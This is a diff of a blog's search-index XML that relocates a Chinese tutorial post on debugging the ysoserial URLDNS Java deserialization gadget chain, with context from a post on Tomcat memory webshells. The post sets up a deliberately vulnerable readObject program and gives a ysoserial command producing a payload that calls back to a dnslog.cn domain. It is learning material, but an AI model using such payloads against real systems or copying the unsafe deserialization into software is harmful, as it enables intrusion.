@@ -5283,6 +5283,83 @@ if err != nil {
       </tags>
   </entry>
   <entry>
+    <title>URLDNS调试那些小事</title>
+    <url>//post/URLDNS%E8%B0%83%E8%AF%95%E9%82%A3%E4%BA%9B%E5%B0%8F%E4%BA%8B.html</url>
+    <content><![CDATA[URLDNS调试那些小事近期在看javaweb相关的知识，ysoserial作为反序列化利用链的神器，想稍微利用它来调试一个简单的urldns利用链，进而了解这个工具。
+ysoserial链接：下载地址: https://github.com/frohoff/ysoserial
+这里用jdk1.8来编译
+
+编译ysoserial用JIdea打开导入，会自动导入依赖，导入以后可能还会出现pom.xml红色表示找不到对应依赖的情况，这时可以进入依赖文件夹，可能是用于多个版本jar下载到了其他版本，删除版本然后，再重下载即可（俺在这里卡了好久）。
+下载好后进入GeneratePayload这个类
+进行run，若出现报错可能对应的jar包的版本不对，删除jar包重新下载。
+若运行成功后
+
+按下蓝色小闪电，然后package进行编译打包。
+target目录下会显示编译好的jar包。
+漏洞搭建建立maven项目：
+import java.io.FileInputStream;
+import java.io.ObjectInputStream;
+
+public class bug {
+    public static void main(String[] args) throws Exception {
+        FileInputStream inputStream = new FileInputStream("poc.ser");
+        ObjectInputStream oi = new ObjectInputStream(inputStream);
+        oi.readObject();
+        oi.close();
+        System.out.println("反序列化完成");
+
+    }
+}
+
+ps：漏洞环境不太准确，只是把序列化文件读进去，然后进行反序列化而已。
+生成恶意poc：
+在http://dnslog.cn/
+获得临时域名：0dt3fc.dnslog.cn
+ java -jar .\ysoserial-0.0.5-all.jar URLDNS “http://0dt3fc.dnslog.cn" &gt; poc.ser
+将poc.ser放在漏洞项目根目录运行即可。
+
+注：这里有一个坑点，要是以powershell去生成poc文件会执行报错，需cmd，可参考：https://gitter.im/frohoff/ysoserial/archives/2017/09/18
+调试大致原理是java.util.HashMap 重写了 readObject, 在反序列化时会调用 hash 函数计算 key 的 hashCode.而 java.net.URL 的 hashCode 在计算时会调用 getHostAddress 来解析域名, 从而发出 DNS 请求，常用作无回显情况下验证java反序列漏洞的情况（俺没碰见过，可能是太菜了，或者运气不好哦）。
+在URLDNS.java下，作者写了如下利用链：
+*   Gadget Chain:
+*     HashMap.readObject()
+*       HashMap.putVal()
+*         HashMap.hash()
+*           URL.hashCode()
+*
+
+在刚开始会new  HashMap()，
+
+接下来会调用会调用putVal方法，putVal作用在于HashMap放入键值，这里调用了hash方法来处理key
+
+值得关注key.hashCode()方法，
+
+当hashcode==-1时会执行hashCode = handler.hashCode(this);（默认值为-1所以这里不用太在意）
+这里调用getHostAddress
+
+他会进行dns的查询。
+然后就是一些细节：
+在Hashmap的readObject
+
+key是从readObject得到的，说明key应该在writeObject被写入了。
+WriteObject最后会调用到internalWriteEntries(s)。
+
+从中可看出，key和value都来自table，即HashMap中table的值。
+要修改table一般会调用HashMap的put方法，从而调用putVal，这样就会造成dns请求，会和目标机器的混淆。
+
+这里ysoserial 继承抽象类SilentURLStreamHandler类，重写了openConnection和getHostAddress，
+可以直接返回NULL，不会有后续的操作，从而不会dns请求。
+知道这些我们也可以通过反射来将poc再写一遍，网上大佬们写的很完善了，俺就不班门弄斧了。
+参考：
+https://www.yuque.com/pmiaowu/gpy1q8/ygthda
+https://baijiahao.baidu.com/s?id=1711619506108128533&amp;wfr=spider&amp;for=pc
+https://xz.aliyun.com/t/7157?page=5
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Tomcat内存马简析</title>
     <url>//post/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E8%A7%A3%E6%9E%90.html</url>
     <content><![CDATA[Tomcat内存马简析  webshell木马配合webshell管理工具可以方便对于服务器、内网进行进一步的维权、入侵，随着对文件内容查杀、以Ai对流量特征和行为模式的查杀等等手段，普通文件形式的webshell木马可靠性越来越差。也许好不容易绕过waf传上去两分钟不到就被杀掉了，所以攻击方在近些年也慢慢的研发出“无文件”的webshell木马，即内存马。内存马的概念提出比较久的，但走进视野就近几年的事情，每隔一段时间总能看到不少师傅提出新的内存马实现方法，这里简单说下利用JavaWeb的三大组件Servle、Filter、Listener来动态注册内存马的方式。
@@ -5859,83 +5936,6 @@ wrapper.setServletClass(servlet.getServletClass());
     standardContext.addServletMappingDecoded("/*",servletname);
 %&gt;
 小结  这里只介绍了最基本的几种内存马，对于spring默认不解析jsp的有其他的利用方式，而且字节注入内存马和其他骚操作也有很广的利用场景，不少师傅也挖到了利用链，但在实战中写内存马一定要注意路径匹配问题，一旦把路由弄乱，影响测试方的正常业务，那就糟糕了。
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>URLDNS调试那些小事</title>
-    <url>//post/URLDNS%E8%B0%83%E8%AF%95%E9%82%A3%E4%BA%9B%E5%B0%8F%E4%BA%8B.html</url>
-    <content><![CDATA[URLDNS调试那些小事近期在看javaweb相关的知识，ysoserial作为反序列化利用链的神器，想稍微利用它来调试一个简单的urldns利用链，进而了解这个工具。
-ysoserial链接：下载地址: https://github.com/frohoff/ysoserial
-这里用jdk1.8来编译
-
-编译ysoserial用JIdea打开导入，会自动导入依赖，导入以后可能还会出现pom.xml红色表示找不到对应依赖的情况，这时可以进入依赖文件夹，可能是用于多个版本jar下载到了其他版本，删除版本然后，再重下载即可（俺在这里卡了好久）。
-下载好后进入GeneratePayload这个类
-进行run，若出现报错可能对应的jar包的版本不对，删除jar包重新下载。
-若运行成功后
-
-按下蓝色小闪电，然后package进行编译打包。
-target目录下会显示编译好的jar包。
-漏洞搭建建立maven项目：
-import java.io.FileInputStream;
-import java.io.ObjectInputStream;
-
-public class bug {
-    public static void main(String[] args) throws Exception {
-        FileInputStream inputStream = new FileInputStream("poc.ser");
-        ObjectInputStream oi = new ObjectInputStream(inputStream);
-        oi.readObject();
-        oi.close();
-        System.out.println("反序列化完成");
-
-    }
-}
-
-ps：漏洞环境不太准确，只是把序列化文件读进去，然后进行反序列化而已。
-生成恶意poc：
-在http://dnslog.cn/
-获得临时域名：0dt3fc.dnslog.cn
- java -jar .\ysoserial-0.0.5-all.jar URLDNS “http://0dt3fc.dnslog.cn" &gt; poc.ser
-将poc.ser放在漏洞项目根目录运行即可。
-
-注：这里有一个坑点，要是以powershell去生成poc文件会执行报错，需cmd，可参考：https://gitter.im/frohoff/ysoserial/archives/2017/09/18
-调试大致原理是java.util.HashMap 重写了 readObject, 在反序列化时会调用 hash 函数计算 key 的 hashCode.而 java.net.URL 的 hashCode 在计算时会调用 getHostAddress 来解析域名, 从而发出 DNS 请求，常用作无回显情况下验证java反序列漏洞的情况（俺没碰见过，可能是太菜了，或者运气不好哦）。
-在URLDNS.java下，作者写了如下利用链：
-*   Gadget Chain:
-*     HashMap.readObject()
-*       HashMap.putVal()
-*         HashMap.hash()
-*           URL.hashCode()
-*
-
-在刚开始会new  HashMap()，
-
-接下来会调用会调用putVal方法，putVal作用在于HashMap放入键值，这里调用了hash方法来处理key
-
-值得关注key.hashCode()方法，
-
-当hashcode==-1时会执行hashCode = handler.hashCode(this);（默认值为-1所以这里不用太在意）
-这里调用getHostAddress
-
-他会进行dns的查询。
-然后就是一些细节：
-在Hashmap的readObject
-
-key是从readObject得到的，说明key应该在writeObject被写入了。
-WriteObject最后会调用到internalWriteEntries(s)。
-
-从中可看出，key和value都来自table，即HashMap中table的值。
-要修改table一般会调用HashMap的put方法，从而调用putVal，这样就会造成dns请求，会和目标机器的混淆。
-
-这里ysoserial 继承抽象类SilentURLStreamHandler类，重写了openConnection和getHostAddress，
-可以直接返回NULL，不会有后续的操作，从而不会dns请求。
-知道这些我们也可以通过反射来将poc再写一遍，网上大佬们写的很完善了，俺就不班门弄斧了。
-参考：
-https://www.yuque.com/pmiaowu/gpy1q8/ygthda
-https://baijiahao.baidu.com/s?id=1711619506108128533&amp;wfr=spider&amp;for=pc
-https://xz.aliyun.com/t/7157?page=5
 ]]></content>
       <categories>
         <category>渗透测试</category>
